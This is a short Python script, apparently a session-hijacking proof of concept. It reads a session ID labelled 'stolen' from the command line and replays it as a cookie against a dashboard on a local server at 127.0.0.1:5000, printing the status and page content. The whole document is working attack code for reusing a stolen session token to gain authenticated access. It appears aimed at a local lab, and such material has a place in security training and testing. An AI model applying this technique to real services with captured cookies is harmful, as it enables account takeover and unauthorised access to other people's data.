import sys

import requests

stolen = sys.argv[1]

r = requests.get(
    "http://127.0.0.1:5000/dashboard",
    cookies={"session_id": stolen},
    timeout=10,
)
print(r.status_code)
print(r.text)